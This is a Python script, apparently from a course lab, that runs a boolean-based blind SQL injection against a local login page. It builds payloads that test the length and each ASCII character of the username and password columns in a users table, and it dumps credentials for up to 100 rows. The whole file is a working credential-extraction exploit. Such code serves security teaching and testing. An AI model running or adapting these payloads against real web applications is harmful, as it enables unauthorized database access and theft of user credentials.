import string
import urllib.parse
import urllib.request

BASE_URL = "http://localhost/lab09/login.php"
CHARSET = string.ascii_letters + string.digits
SUCCESS_MARKER = "Printing cat"


def is_success(username_payload, password="x"):
    query = urllib.parse.urlencode({
        "u": username_payload,
        "p": password
    })

    url = "{}?{}".format(BASE_URL, query)

    response = urllib.request.urlopen(url)
    html = response.read().decode("utf-8")
    response.close()

    return SUCCESS_MARKER in html


def find_length(row, field, max_length=200):
    for length in range(1, max_length):

        payload = (
            '" OR (SELECT LENGTH({}) '
            'FROM users LIMIT 1 OFFSET {})={} -- '
        ).format(field, row, length)

        if is_success(payload):
            return length

    return 0


def find_char(row, field, position):
    for char in CHARSET:

        payload = (
            '" OR (SELECT ASCII(SUBSTRING({},{},1)) '
            'FROM users LIMIT 1 OFFSET {})={} -- '
        ).format(field, position, row, ord(char))

        if is_success(payload):
            return char

    return ""


def extract_value(row, field):
    length = find_length(row, field)

    value = ""

    for pos in range(1, length + 1):
        value += find_char(row, field, pos)

    return value


results = []

for row in range(100):

    username = extract_value(row, "username")
    password = extract_value(row, "password")

    results.append((username, password))

    print("Row {}: {} / {}".format(row, username, password))
